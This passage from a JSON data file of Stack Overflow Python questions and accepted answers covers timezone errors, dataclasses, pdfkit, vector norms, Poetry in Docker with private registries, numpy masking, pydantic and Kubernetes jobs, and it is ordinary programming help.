TimeZoneField(models.Field): web_1              \n  File \"/usr/local/lib/python3.10/site-packages/timezone_field/fields.py\", line 41, in TimeZoneField web_1              \n    default_zoneinfo_tzs = [ZoneInfo(tz) for tz in pytz.common_timezones] web_1              \n  File \"/usr/local/lib/python3.10/site-packages/timezone_field/fields.py\", line 41, in  web_1              \n    default_zoneinfo_tzs = [ZoneInfo(tz) for tz in pytz.common_timezones] web_1              \n  File \"/usr/local/lib/python3.10/zoneinfo/_common.py\", line 24, in load_tzdata web_1              \n    raise ZoneInfoNotFoundError(f\"No time zone found with key {key}\") web_1              \nzoneinfo._common.ZoneInfoNotFoundError: 'No time zone found with key Asia/Hanoi' web_1              \n[2022-08-12 12:18:37 +0300] [11] [INFO] Worker exiting (pid: 11) web_1              \n[2022-08-12 09:18:37 +0000] [1] [INFO] Shutting down: Master web_1              \n[2022-08-12 09:18:37 +0000] [1] [INFO] Reason: Worker failed to boot.\n\nIn the Django settings file:\nTIME_ZONE = 'UTC'\nUSE_TZ = True\n\nPS: As suggested in another post I added tzdata to my requirements file but nothing changed.\n",
    "AcceptedAnswerId": 73333278,
    "AcceptedAnswer": "Downgrading the pytz version from 2022.2 to 2022.1 seems to have solved this issue for me.\n"
}
{
    "Id": 73599734,
    "PostTypeId": 1,
    "Title": "Python dataclass, one attribute referencing other",
    "Body": "@dataclass\nclass Stock:\n    symbol: str\n    price: float = get_price(symbol)\n\nCan a dataclass attribute access to the other one? In the above example, one can create a Stock by providing a symbol and the price. If price is not provided, it defaults to a price which we get from some function get_price. Is there a way to reference symbol?\nThis example generates error NameError: name 'symbol' is not defined.\n",
    "AcceptedAnswerId": 73599883,
    "AcceptedAnswer": "You can use __post_init__ here. Because it's going to be called after __init__, you have your attributes already populated so do whatever you want to do there:\nfrom typing import Optional\nfrom dataclasses import dataclass\n\n\ndef get_price(name):\n    # logic to get price by looking at `name`.\n    return 1000.0\n\n\n@dataclass\nclass Stock:\n    symbol: str\n    price: Optional[float] = None\n\n    def __post_init__(self):\n        if self.price is None:\n            self.price = get_price(self.symbol)\n\n\nobj1 = Stock(\"boo\", 2000.0)\nobj2 = Stock(\"boo\")\nprint(obj1.price)  # 2000.0\nprint(obj2.price)  # 1000.0\n\nSo if user didn't pass price while instantiating, price is None. So you can check it in __post_init__ and ask it from get_price.\n"
}
{
    "Id": 73599970,
    "PostTypeId": 1,
    "Title": "How to solve \"wkhtmltopdf reported an error: Exit with code 1 due to network error: ProtocolUnknownError\" in python pdfkit",
    "Body": "I'm using Django. This is code is in views.py.\ndef download_as_pdf_view(request, doc_type, pk):\n    import pdfkit\n    file_name = 'invoice.pdf'\n    pdf_path = os.path.join(settings.BASE_DIR, 'static', 'pdf', file_name)\n\n    template = get_template(\"paypal/card_invoice_detail.html\")\n    _html = template.render({})\n    pdfkit.from_string(_html, pdf_path)\n\n    return FileResponse(open(pdf_path, 'rb'), filename=file_name, content_type='application/pdf')\n\nTraceback is below.\n\n[2022-09-05 00:56:35,785] ERROR [django.request.log_response:224] Internal Server Error: /paypal/download_pdf/card_invoice/MTE0Nm1vamlva29zaGkz/\nTraceback (most recent call last):\n  File \"/usr/local/lib/python3.8/site-packages/django/core/handlers/exception.py\", line 47, in inner\n    response = get_response(request)\n  File \"/usr/local/lib/python3.8/site-packages/django/core/handlers/base.py\", line 181, in _get_response\n    response = wrapped_callback(request, *callback_args, **callback_kwargs)\n  File \"/opt/project/app/paypal/views.py\", line 473, in download_as_pdf_view\n    pdfkit.from_string(str(_html), pdf_path)\n  File \"/usr/local/lib/python3.8/site-packages/pdfkit/api.py\", line 75, in from_string\n    return r.to_pdf(output_path)\n  File \"/usr/local/lib/python3.8/site-packages/pdfkit/pdfkit.py\", line 201, in to_pdf\n    self.handle_error(exit_code, stderr)\n  File \"/usr/local/lib/python3.8/site-packages/pdfkit/pdfkit.py\", line 155, in handle_error\n    raise IOError('wkhtmltopdf reported an error:\\n' + stderr)\nOSError: wkhtmltopdf reported an error:\nExit with code 1 due to network error: ProtocolUnknownError\n\n[2022-09-05 00:56:35,797] ERROR [django.server.log_message:161] \"GET /paypal/download_pdf/card_invoice/MTE0Nm1vamlva29zaGkz/ HTTP/1.1\" 500 107486\n\n\nThis is work file.\npdfkit.from_url('https://google.com', 'google.pdf')\n\nHowever pdfkit.from_string and pdfkit.from_file return \"ProtocolUnknownError\"\nPlease help me!\nUpdate\nI tyied this code.\n    _html = '''Hello world'''\n    pdfkit.from_string(_html), pdf_path)\n\nIt worked fine. I saved above html as sample.html. Then run this code\n\nI added this parameter options={\"enable-local-file-access\": \"\"}\n\n    _html = render_to_string('path/to/sample.html')\n    pdfkit.from_string(str(_html), pdf_path, options={\"enable-local-file-access\": \"\"})\n\nIt worked fine! And the \"ProtocolUnknownError\" error is gone thanks to options={\"enable-local-file-access\": \"\"}.\nSo, I changed the HTML file path to the one I really want to use.\n    _html = render_to_string('path/to/invoice.html')\n    pdfkit.from_string(_html, pdf_path, options={\"enable-local-file-access\": \"\"})\n    return FileResponse(open(pdf_path, 'rb'), filename=file_name, content_type='application/pdf')\n\nIt does not finish convert pdf. When I run the code line by line.\nstdout, stderr = result.communicate(input=input) does not return.\nIt was processing long time.\n",
    "AcceptedAnswerId": 73603802,
    "AcceptedAnswer": "I solved this problem. Theare are 3 step to pass this problems.\n\nYou need to set options {\"enable-local-file-access\": \"\"}. pdfkit.from_string(_html, pdf_path, options={\"enable-local-file-access\": \"\"})\n\npdfkit.from_string() can't load css from URL. It's something like this.\n css path should be absolute path or write style in same file.\n\nIf css file load another file. ex: font file. It will be ContentNotFoundError.\n\n\nMy solution\nI used simple css file like this.\nbody {\n    font-size: 18px;\n    padding: 55px;\n}\n\nh1 {\n    font-size: 38px;\n}\n\nh2 {\n    font-size: 28px;\n}\n\nh3 {\n    font-size: 24px;\n}\n\nh4 {\n    font-size: 20px;\n}\n\ntable, th, td {\n    margin: auto;\n    text-align: center;\n    border: 1px solid;\n}\n\ntable {\n    width: 80%;\n}\n\n.text-right {\n    text-align: right;\n}\n\n\n.text-left {\n    text-align: left;\n}\n\n.text-center {\n    text-align: center;\n}\n\nThis code insert last css file as style in same html.\nimport os\n\nimport pdfkit\nfrom django.http import FileResponse\nfrom django.template.loader import render_to_string\n\nfrom paypal.models import Invoice\nfrom website import settings\n\n\ndef download_as_pdf_view(request, pk):\n    # create PDF from HTML template file with context.\n    invoice = Invoice.objects.get(pk=pk)\n    context = {\n        # please set your contexts as dict.\n    }\n    _html = render_to_string('paypal/card_invoice_detail.html', context)\n     # remove header\n    _html = _html[_html.find(''):]  \n\n    # create new header\n    new_header = '''\n    \n    \n    \n    \n    \n'''\n    # add style from css file. please change to your css file path.\n    css_path = os.path.join(settings.BASE_DIR, 'paypal', 'static', 'paypal', 'css', 'invoice.css')\n    with open(css_path, 'r') as f:\n        new_header += f.read()\n    new_header += '\\n'\n    print(new_header)\n\n    # add head to html\n    _html = new_header + _html[_html.find(''):]\n    with open('paypal/sample.html', 'w') as f: f.write(_html)  # for debug\n\n    # convert html to pdf\n    file_name = 'invoice.pdf'\n    pdf_path = os.path.join(settings.BASE_DIR, 'static', 'pdf', file_name)\n    pdfkit.from_string(_html, pdf_path, options={\"enable-local-file-access\": \"\"})\n    return FileResponse(open(pdf_path, 'rb'), filename=file_name, content_type='application/pdf')\n\n"
}
{
    "Id": 73269424,
    "PostTypeId": 1,
    "Title": "Interpreting the effect of LK Norm with different orders on training machine learning model with the presence of outliers",
    "Body": "( Both the RMSE and the MAE are ways to measure the distance between two vectors: the vector of predictions and the vector of target values. Various distance measures, or norms, are possible. Generally speaking, calculating the size or length of a vector is often required either directly or as part of a broader vector or vector-matrix operation.\nEven though the RMSE is generally the preferred performance measure for regression tasks, in some contexts you may prefer to use another function. For instance, if there are many outliers instances in the dataset, in this case, we may consider using mean absolute error (MAE).\nMore formally, the higher the norm index, the more it focuses on large values and neglect small ones. This is why RMSE is more sensitive to outliers than MAE.) Source: hands on machine learning with scikit learn and tensorflow.\nTherefore, ideally, in any dataset, if we have a great number of outliers, the loss function, or the norm of the vector \"representing the absolute difference between predictions and true labels; similar to y_diff in the code below\" should grow if we increase the norm... In other words, RMSE should be greater than MAE. --> correct me if mistaken \nGiven this definition, I have generated a random dataset and added many outliers to it as seen in the code below. I calculated the lk_norm for the residuals, or y_diff for many k values, ranging from 1 to 5. However, I found that the lk_norm decreases as the value of k increases; however, I was expecting that RMSE, aka norm = 2, to be greater than MAE, aka norm = 1.\nI would love to understand how LK norm is decreasing as we increase K, aka the order, which is contrary to the definition above.\nThanks in advance for any help!\nCode:\nimport numpy as np\nimport plotly.offline as pyo\nimport plotly.graph_objs as go\nfrom plotly import tools\n\nnum_points = 1000\nnum_outliers = 50\n\nx = np.linspace(0, 10, num_points)\n\n# places where to add outliers:\noutlier_locs = np.random.choice(len(x), size=num_outliers, replace=False)\noutlier_vals = np.random.normal(loc=1, scale=5, size=num_outliers)\n\ny_true = 2 * x\ny_pred = 2 * x + np.random.normal(size=num_points)\ny_pred[outlier_locs] += outlier_vals\n\ny_diff = y_true - y_pred\n\nlosses_given_lk = []\nnorms = np.linspace(1, 5, 50)\n\nfor k in norms:\n    losses_given_lk.append(np.linalg.norm(y_diff, k))\n\ntrace_1 = go.Scatter(x=norms, \n                     y=losses_given_lk, \n                     mode=\"markers+lines\", \n                     name=\"lk_norm\")\n\ntrace_2 = go.Scatter(x=x, \n                     y=y_true, \n                     mode=\"lines\", \n                     name=\"y_true\")\n\ntrace_3 = go.Scatter(x=x, \n                     y=y_pred, \n                     mode=\"markers\", \n                     name=\"y_true + noise\")\n\nfig = tools.make_subplots(rows=1, cols=3, subplot_titles=(\"lk_norms\", \"y_true\", \"y_true + noise\"))\nfig.append_trace(trace_1, 1, 1)\nfig.append_trace(trace_2, 1, 2)\nfig.append_trace(trace_3, 1, 3)\n\npyo.plot(fig, filename=\"lk_norms.html\")\n\nOutput:\n\nFinally, I would love to know, in which cases one uses L3 or L4 norm, etc...?\n",
    "AcceptedAnswerId": 73339587,
    "AcceptedAnswer": "Another python implementation for the np.linalg is:\ndef my_norm(array, k):\n    return np.sum(np.abs(array) ** k)**(1/k)\n\nTo test our function, run the following:\narray = np.random.randn(10)\nprint(np.linalg.norm(array, 1), np.linalg.norm(array, 2), np.linalg.norm(array, 3), np.linalg.norm(array, 10))\n# And\nprint(my_norm(array, 1), my_norm(array, 2), my_norm(array, 3), my_norm(array, 10))\n\noutput:\n(9.561258110585216, 3.4545982749318846, 2.5946495606046547, 2.027258231324604)\n(9.561258110585216, 3.454598274931884, 2.5946495606046547, 2.027258231324604)\n\nTherefore, we can see that the numbers are decreasing, similar to our output in the figure posted in the question above.\nHowever, the correct implementation of RMSE in python is: np.mean(np.abs(array) ** k)**(1/k) where k is equal to 2. As a result, I have replaced the sum by the mean.\nTherefore, if I add the following function:\ndef my_norm_v2(array, k):\n    return np.mean(np.abs(array) ** k)**(1/k)\n\nAnd run the following:\nprint(my_norm_v2(array, 1), my_norm_v2(array, 2), my_norm_v2(array, 3), my_norm_v2(array, 10))\n\nOutput:\n(0.9561258110585216, 1.092439894967332, 1.2043296427640868, 1.610308452218342)\n\nHence, the numbers are increasing.\nIn the code below I rerun the same code posted in the question above with a modified implementation and I got the following:\nimport numpy as np\nimport plotly.offline as pyo\nimport plotly.graph_objs as go\nfrom plotly import tools\n\nnum_points = 1000\nnum_outliers = 50\n\nx = np.linspace(0, 10, num_points)\n\n# places where to add outliers:\noutlier_locs = np.random.choice(len(x), size=num_outliers, replace=False)\noutlier_vals = np.random.normal(loc=1, scale=5, size=num_outliers)\n\ny_true = 2 * x\ny_pred = 2 * x + np.random.normal(size=num_points)\ny_pred[outlier_locs] += outlier_vals\n\ny_diff = y_true - y_pred\n\nlosses_given_lk = []\nlosses = []\nnorms = np.linspace(1, 5, 50)\n\nfor k in norms:\n    losses_given_lk.append(np.linalg.norm(y_diff, k))\n    losses.append(my_norm(y_diff, k))\n\ntrace_1 = go.Scatter(x=norms, \n                     y=losses_given_lk, \n                     mode=\"markers+lines\", \n                     name=\"lk_norm\")\n\ntrace_2 = go.Scatter(x=norms, \n                     y=losses, \n                     mode=\"markers+lines\", \n                     name=\"my_lk_norm\")\n\ntrace_3 = go.Scatter(x=x, \n                     y=y_true, \n                     mode=\"lines\", \n                     name=\"y_true\")\n\ntrace_4 = go.Scatter(x=x, \n                     y=y_pred, \n                     mode=\"markers\", \n                     name=\"y_true + noise\")\n\nfig = tools.make_subplots(rows=1, cols=4, subplot_titles=(\"lk_norms\", \"my_lk_norms\", \"y_true\", \"y_true + noise\"))\nfig.append_trace(trace_1, 1, 1)\nfig.append_trace(trace_2, 1, 2)\nfig.append_trace(trace_3, 1, 3)\nfig.append_trace(trace_4, 1, 4)\n\npyo.plot(fig, filename=\"lk_norms.html\")\n\nOutput:\n\nAnd that explains why the loss increase as we increase k.\n"
}
{
    "Id": 74106823,
    "PostTypeId": 1,
    "Title": "Working Poetry project with private dependencies inside Docker",
    "Body": "I have a Python library hosted in Google Cloud Platform Artifact Registry. Besides, I have a Python project, using Poetry, that depends on the library.\nThis is my project file pyproject.toml:\n[tool.poetry]\nname = \"Test\"\nversion = \"0.0.1\"\ndescription = \"Test project.\"\nauthors = [\n    \"Me \"\n]\n\n[tool.poetry.dependencies]\npython = \">=3.8,<4.0\"\nmylib = \"0.1.1\"\n\n[tool.poetry.dev-dependencies]\n\"keyrings.google-artifactregistry-auth\" = \"^1.1.0\"\nkeyring = \"^23.9.0\"\n\n[build-system]\nrequires = [\"poetry-core>=1.1.0\"]\nbuild-backend = \"poetry.core.masonry.api\"\n\n[[tool.poetry.source]]\nname = \"my-lib\"\nurl = \"https://us-east4-python.pkg.dev/my-gcp-project/my-lib/simple/\"\nsecondary = true\n\n\nTo enable using my private repository, I installed gcloud CLI and authenticated with my credentials. So when I run this command, I see proper results, like this:\n$ gcloud auth list\nACTIVE  ACCOUNT\n...\n*       @appspot.gserviceaccount.com\n...\n\nAdditionally, I'm using Python keyring togheter with keyrings.google-artifactregistry-auth, as you can see in the project file.\nSo, with this setup, I can run poetry install, the dependency gets downloaded from my private artifact registry, using the authentication from GCP.\n\nThe issue comes when I try to apply the same principles inside a Docker container.\nI created a Docker file like this:\n# syntax = docker/dockerfile:1.3\nFROM python:3.9\n\n# Install Poetry\nRUN curl -sSL https://install.python-poetry.org | python3 -\nENV PATH \"${PATH}:/root/.local/bin\"\n\n# Install Google Cloud SDK CLI\nARG GCLOUD_VERSION=\"401.0.0-linux-x86_64\"\nRUN wget -q https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-cli-${GCLOUD_VERSION}.tar.gz && \\\n    tar -xf google-cloud-cli-*.tar.gz && \\\n    ./google-cloud-sdk/install.sh --quiet && \\\n    rm google-cloud-cli-*.tar.gz\nENV PATH \"${PATH}:/google-cloud-sdk/bin\"\n\n# install Google Artifact Rrgistry keyring integration\nRUN pip install keyrings.google-artifactregistry-auth\nRUN --mount=type=secret,id=GOOGLE_APPLICATION_CREDENTIALS ${GOOGLE_APPLICATION_CREDENTIALS} gcloud auth activate-service-account --key-file=/run/secrets/GOOGLE_APPLICATION_CREDENTIALS\nRUN gcloud auth list\nRUN keyring --list-backends\n\nWORKDIR /app\n\n# copy Poetry project files and install dependencies\nCOPY ./.env* ./\nCOPY ./pyproject.toml ./poetry.lock* ./\nRUN poetry install\n\n# copy source files\nCOPY ./app /app/app\n\n# run the program\nCMD poetry run python -m app.main\n\n\nAs you can see, I injected the Google credentials file, following this documentation. This works. I used Docker BuildKit secrets, as exposed here (security concerns are not a matter of this question). So, when I try to build the image, I got an authentication error (GOOGLE_APPLICATION_CREDENTIALS is properly set pointing to a valid key file):\n$ DOCKER_BUILDKIT=1 docker image build --secret id=GOOGLE_APPLICATION_CREDENTIALS,src=${GOOGLE_APPLICATION_CREDENTIALS} -t app-test .\n\n...\n#19 66.68 Source (my-lib): Authorization error accessing https://us-east4-python.pkg.dev/my-gcp-project/my-lib/simple/mylib/\n#19 68.21\n#19 68.21   RuntimeError\n#19 68.21\n#19 68.22   Unable to find installation candidates for mylib (0.1.1)\n...\n\nIf I execute, line by line, all the commands in the Dockerfile, using the same Google credentials key file outside Docker, I got it working.\nI even tried to debug inside the image, not executing poetry install, nor poetry run... commands, and I saw this, if it helps to debug:\n# gcloud auth list\n                  Credentialed Accounts\nACTIVE  ACCOUNT\n*       @appspot.gserviceaccount.com\n\n\n# keyring --list-backends\nkeyrings.gauth.GooglePythonAuth (priority: 9)\nkeyring.backends.chainer.ChainerBackend (priority: -1)\nkeyring.backends.fail.Keyring (priority: 0)\n\nFinally, I even tried following this approach: Using Keyring on headless Linux systems in a Docker container, with the same results:\n# apt update\n...\n# apt install -y gnome-keyring\n...\n# dbus-run-session -- sh\nGNOME_KEYRING_CONTROL=/root/.cache/keyring-MEY1T1\nSSH_AUTH_SOCK=/root/.cache/keyring-MEY1T1/ssh\n# poetry install\n...\n  \u2022 Installing mylib (0.1.1): Failed\n\n  RuntimeError\n\n  Unable to find installation candidates for mylib (0.1.1)\n\n  at ~/.local/share/pypoetry/venv/lib/python3.9/site-packages/poetry/installation/chooser.py:103 in choose_for\n       99\u2502\n      100\u2502             links.append(link)\n      101\u2502\n      102\u2502         if not links:\n    \u2192 103\u2502             raise RuntimeError(f\"Unable to find installation candidates for {package}\")\n      104\u2502\n      105\u2502         # Get the best link\n      106\u2502         chosen = max(links, key=lambda link: self._sort_key(package, link))\n      107\u2502\n...\n\n\nI even tried following the advices of this other question. No success.\ngcloud CLI works inside the container, testing other commands. My guess is that the integration with Keyring is not working properly, but I don't know how to debug it.\nHow can I get my dependency resolved inside a Docker container?\n",
    "AcceptedAnswerId": 75218763,
    "AcceptedAnswer": "Finally, I found a solution that worked in my use case.\nThere are two main parts:\n\nInstalling keyrings.google-artifactregistry-auth as a Poetry plugin, using this command:\n\npoetry self add keyrings.google-artifactregistry-auth\n\n\nAuthenticating inside the container using a service account key file:\n\ngcloud auth activate-service-account --key-file=key.json\n\nIn my case, I use BuildKit secrets to handle it.\nThen, for instance, the Dockerfile would like this:\nFROM python:3.9\n\n# Install Poetry\nRUN curl -sSL https://install.python-poetry.org | python3 -\nENV PATH \"${PATH}:/root/.local/bin\"\n\n# install Google Artifact Registry tools for Python as a Poetry plugin\nRUN poetry self add keyrings.google-artifactregistry-auth\n\n# Install Google Cloud SDK CLI\nARG GCLOUD_VERSION=\"413.0.0-linux-x86_64\"\nRUN wget -q https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-cli-${GCLOUD_VERSION}.tar.gz && \\\n    tar -xf google-cloud-cli-*.tar.gz && \\\n    ./google-cloud-sdk/install.sh --quiet && \\\n    rm google-cloud-cli-*.tar.gz\nENV PATH \"${PATH}:/google-cloud-sdk/bin\"\n\n# authenticate with gcloud using a BuildKit secret\nRUN --mount=type=secret,id=gac.json \\\n    gcloud auth activate-service-account --key-file=/run/secrets/gac.json\n\nCOPY ./pyproject.toml ./poetry.lock* /\nRUN poetry install\n\n# deauthenticate with gcloud once the dependencies are already installed to clean the image\nRUN gcloud auth revoke --all\n\nCOPY ./app /app\n\nWORKDIR /app\n\nCMD [\"whatever\", \"command\", \"you\", \"use\"]\n\nAnd the Docker build command, providing the secret:\nDOCKER_BUILDKIT=1 docker image build \\\n        --secret id=gac.json,src=${GOOGLE_APPLICATION_CREDENTIALS} \\\n        -t ${YOUR_TAG} .\n\nAnd with Docker Compose, a similar approach:\nservices:\n  yourapp:\n    build:\n      context: .\n      secrets:\n        - key.json\n    image: yourapp:yourtag\n    ...\n\nCOMPOSE_DOCKER_CLI_BUILD=1 DOCKER_BUILDKIT=1 docker compose up --build\n\n"
}
{
    "Id": 73910005,
    "PostTypeId": 1,
    "Title": "How to sum an ndarray over ranges bounded by other indexes",
    "Body": "For an array of multiple dimensions, I would like to sum along some dimensions, with the sum range defined by other dimension indexes. Here is an example:\n>>> import numpy as np\n>>> x = np.arange(2*3*4).reshape((2,3,4))\n>>> x\narray([[[ 0,  1,  2,  3],\n        [ 4,  5,  6,  7],\n        [ 8,  9, 10, 11]],\n\n       [[12, 13, 14, 15],\n        [16, 17, 18, 19],\n        [20, 21, 22, 23]]])\n>>> wanted = [[sum(x[i,j,i:j]) for j in range(x.shape[1])] for i in range(x.shape[0])]\n>>> wanted\n[[0, 4, 17], [0, 0, 21]]\n\nIs there a more efficient way to do it without for loops or list comprehension? My array is quite large.\n",
    "AcceptedAnswerId": 73910175,
    "AcceptedAnswer": "You can use boolean masks:\n# get lower triangles\nm1 = np.arange(x.shape[1])[:,None]>np.arange(x.shape[2])\n\n# get columns index >= depth index\nm2 = np.arange(x.shape[2])>=np.arange(x.shape[0])[:,None,None]\n\n# combine both mask to form 3D mask\nmask = m1 & m2\n\nout = np.where(mask, x, 0).sum(axis=2)\n\noutput:\narray([[ 0,  4, 17],\n       [ 0,  0, 21]])\n\nMasks:\n# m1\narray([[False, False, False, False],\n       [ True, False, False, False],\n       [ True,  True, False, False]])\n\n# m2\narray([[[ True,  True,  True,  True]],\n\n       [[False,  True,  True,  True]]])\n\n# mask\narray([[[False, False, False, False],\n        [ True, False, False, False],\n        [ True,  True, False, False]],\n\n       [[False, False, False, False],\n        [False, False, False, False],\n        [False,  True, False, False]]])\n\n"
}
{
    "Id": 72087819,
    "PostTypeId": 1,
    "Title": "Pydantic set attribute/field to model dynamically",
    "Body": "According to the docs:\n\nallow_mutation\nwhether or not models are faux-immutable, i.e. whether setattr is allowed (default: True)\n\nWell I have a class :\nclass MyModel(BaseModel):\n\n    field1:int\n\n    class Config:\n        allow_mutation = True\n\nIf I try to add a field dynamically :\nmodel1 = MyModel(field1=1)\nmodel1.field2 = 2\n\nAnd I get this error :\n  File \"pydantic/main.py\", line 347, in pydantic.main.BaseModel.__setattr__\nValueError: \"MyModel\" object has no field \"field2\"\n\nObviously, using setattr method will lead to the same error.\nsetattr(model1, 'field2', 2)\n\nOutput:\n  File \"pydantic/main.py\", line 347, in pydantic.main.BaseModel.__setattr__\nValueError: \"MyModel\" object has no field \"field2\"\n\nWhat did I miss here ?\n",
    "AcceptedAnswerId": 73373318,
    "AcceptedAnswer": "You can use the Config object within the class and set the extra attribute to \"allow\" or use it as extra=Extra.allow kwargs when declaring the model\nExample from the docs :\nfrom pydantic import BaseModel, ValidationError, Extra\n\n\nclass Model(BaseModel, extra=Extra.forbid):\n    a: str\n\n\ntry:\n    Model(a='spam', b='oh no')\nexcept ValidationError as e:\n    print(e)\n    \"\"\"\n    1 validation error for Model\n    b\n      extra fields not permitted (type=value_error.extra)\n    \"\"\"\n\n"
}
{
    "Id": 73343529,
    "PostTypeId": 1,
    "Title": "Django google kubernetes client not running exe inside the job",
    "Body": "I have a docker image that I want to run inside my django code. Inside that image there is an executable that I have written using c++ that writes it's output to google cloud storage. Normally when I run the django code like this:\ncontainer = client.V1Container(name=container_name, command=[\"//usr//bin//sleep\"], args=[\"3600\"], image=container_image, env=env_list, security_context=security)\n\nAnd manually go inside the container to run this:\ngcloud container clusters get-credentials my-cluster --region us-central1 --project proj_name  && kubectl exec pod-id -c jobcontainer -- xvfb-run -a \"path/to/exe\"\n\nIt works as intended and gives off the output to cloud storage. (I need to use a virtual monitor so I'm using xvfb first). However I must call this through django like this:\ncontainer = client.V1Container(name=container_name, command=[\"xvfb-run\"], args=[\"-a\",\"\\\"path/to/exe\\\"\"], image=container_image, env=env_list, security_context=security)\n\nBut when I do this, the job gets created but never finishes and does not give off an output to the storage. When I go inside my container to run ps aux I get this output:\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.0   2888  1836 ?        Ss   07:34   0:00 /bin/sh /usr/bin/xvfb-run -a \"path/to/exe\"\nroot          16  0.0  1.6 196196 66256 ?        S    07:34   0:00 Xvfb :99 -screen 0 1280x1024x24 -nolisten tcp -auth /tmp/xvfb-run.r5gaBO/Xauthority\nroot          35  0.0  0.0   7016  1552 ?        Rs   10:31   0:00 ps aux\n\nIt looks like it's stuck inside my code but my code does not have a loop that it can stuck inside, perhaps there is an error occurring (I don't think so since the exact same command is working when typed manually). If there is an error how can I see the console output? Why is my code get stuck and how can I get my desired output? Could there be an error caused by permissions (The code does a lot of stuff that requires permissions like writing to storage and reading files inside the pod, but like mentioned works normally when i run it via the command line)?\n",
    "AcceptedAnswerId": 73404150,
    "AcceptedAnswer": "Apparently for anyone having a similar issue, we fixed it by adding the command we want to run at the end of the Dockerfile instead of passing it as a parameter inside django's container call like this:\ncmd[\"entrypoint.sh\"]\n\nentrypoint.sh:\nxvfb-run -a \"path/to/exe\"\n\nInstead of calling it inside django like we did before and simply removing the command argument from the container call so it looked like this:\ncontainer = client.V1Container(name=container_name, image=container_image, env=env_list, stdin=True, security_context=security)\n\n"
}
{
    "Id": 73660050,
    "PostTypeId": 1,
    "Title": "How to achieve \"resumption semantics\" for Python exceptions?",
    "Body": "I have a validator class with a method that performs multiple checks and may raise different exceptions:\nclass Validator:\n    def validate(something) -> None:\n        if a:\n            raise ErrorA()\n        if b:\n            raise ErrorB()\n        if c:\n            raise ErrorC()\n\nThere's a place in the outside (caller) code where I want to customize its behaviour and prevent ErrorB from being raised, without preventing ErrorC. Something like resumption semantics would be useful here. Hovewer, I haven't found a good way to achieve this.\nTo clarify: I have the control over Validator source code, but prefer to preserve its existing interface as much as possible.\nSome possible solutions that I've considered:\n\nThe obvious\ntry:\n    validator.validate(something)\nexcept ErrorB:\n    ...\n\nis no good because it also suppresses ErrorC in cases where both ErrorB and ErrorC should be raised.\n\nCopy-paste the method and remove the check:\n# In the caller module\n\nclass CustomValidator(Validator):\n    def validate(something) -> None:\n        if a:\n            raise ErrorA()\n        if c:\n            raise ErrorC()\n\nDuplicating the logic for a and c is a bad idea\nand will lead to bugs if Validator changes.\n\nSplit the method into separate checks:\nclass Validator:\n    def validate(something) -> None:\n        self.validate_a(something)\n        self.validate_b(something)\n        self.validate_c(something)\n\n    def validate_a(something) -> None:\n        if a:\n            raise ErrorA()\n\n    def validate_b(something) -> None:\n        if b:\n            raise ErrorB()\n\n    def validate_c(something) -> None:\n        if c:\n            raise ErrorC()\n\n# In the caller module\n\nclass CustomValidator(Validator):\n    def validate(something) -> None:\n        super().validate_a(something)\n        super().validate_c(something)\n\nThis is just a slightly better copy-paste.\nIf some validate_d() is added later, we have a bug in CustomValidator.\n\nAdd some suppression logic by hand:\nclass Validator:\n    def validate(something, *, suppress: list[Type[Exception]] = []) -> None:\n        if a:\n            self._raise(ErrorA(), suppress)\n        if b:\n            self._raise(ErrorB(), suppress)\n        if c:\n            self._raise(ErrorC(), suppress)\n\n    def _raise(self, e: Exception, suppress: list[Type[Exception]]) -> None:\n        with contextlib.suppress(*suppress):\n            raise e\n\nThis is what I'm leaning towards at the moment.\nThere's a new optional parameter and the raise syntax becomes kinda ugly,\nbut this is an acceptable cost.\n\nAdd flags that disable some checks:\nclass Validator:\n    def validate(something, *, check_a: bool = True,\n                 check_b: bool = True, check_c: bool = True) -> None:\n        if check_a and a:\n            raise ErrorA()\n        if check_b and b:\n            raise ErrorB()       \n        if check_c and c:\n            raise ErrorC()\n\nThis is good, because it allows to granually control different checks even\nif they raise the same exception.\nHowever, it feels verbose and will require additional maintainance\nas Validator changes. I actually have more than three checks there.\n\nYield exceptions by value:\nclass Validator:\n    def validate(something) -> Iterator[Exception]:\n        if a:\n            yield ErrorA()\n        if b:\n            yield ErrorB()\n        if c:\n            yield ErrorC()\n\nThis is bad, because it's a breaking change for existing callers\nand it makes propagating the exception (the typical use) way more verbose:\n# Instead of\n# validator.validate(something)\n\ne = next(validator.validate(something), None)\nif e is not None:\n    raise e\n\nEven if we keep everything backwards-compatible\nclass Validator:\n    def validate(something) -> None:\n        e = next(self.iter_errors(something), None)\n        if e is not None:\n            raise e\n\n    def iter_errors(something) -> Iterator[Exception]:\n        if a:\n            yield ErrorA()\n        if b:\n            yield ErrorB()\n        if c:\n            yield ErrorC()\n\nThe new suppressing caller still needs to write all this code:\nexceptions = validator.iter_errors(something)\ne = next(exceptions, None)\nif isinstance(e, ErrorB):\n    # Skip ErrorB, don't raise it.\n    e = next(exceptions, None)\nif e is not None:\n    raise e\n\nCompared to the previous two options:\nvalidator.validate(something, suppress=[ErrorB])\n\nvalidator.validate(something, check_b=False)\n\n\n\n",
    "AcceptedAnswerId": 73662557,
    "AcceptedAnswer": "With bare exceptions you are looking at the wrong tool for the job. In Python, to raise an exception means that execution hits an exceptional case in which resuming is not possible. Terminating the broken execution is an express purpose of exceptions.\n\nExecution Model: 4.3. Exceptions\nPython uses the \u201ctermination\u201d model of error handling: an exception handler can find out what happened and continue execution at an outer level, but it cannot repair the cause of the error and retry the failing operation (except by re-entering the offending piece of code from the top).\n\nTo get resumption semantics for exception handling, you can look at the generic tools for either resumption or for handling.\n\nResumption: Coroutines\nPython's resumption model are coroutines: yield coroutine-generators or async coroutines both allow to pause and explicitly resume execution.\ndef validate(something) -> Iterator[Exception]:\n    if a:\n        yield ErrorA()\n    if b:\n        yield ErrorB()\n    if c:\n        yield ErrorC()\n\nIt is important to distinguish between send-style \"proper\" coroutines and iterator-style \"generator\" coroutines. As long as no value must be sent into the coroutine, it is functionally equivalent to an iterator. Python has good inbuilt support for working with iterators:\nfor e in validator.iter_errors(something):\n    if isinstance(e, ErrorB):\n        continue  # continue even if ErrorB happens\n    raise e\n\nSimilarly, one could filter the iterator or use comprehensions. Iterators easily compose and gracefully terminate, making them suitable for iterating exception cases.\n\nEffect Handling\nException handling is just the common use case for the more generic effect handling. While Python has no builtin effect handling support, simple handlers that address only the origin or sink of an effect can be modelled just as functions:\ndef default_handler(failure: BaseException):\n    raise failure\n\ndef 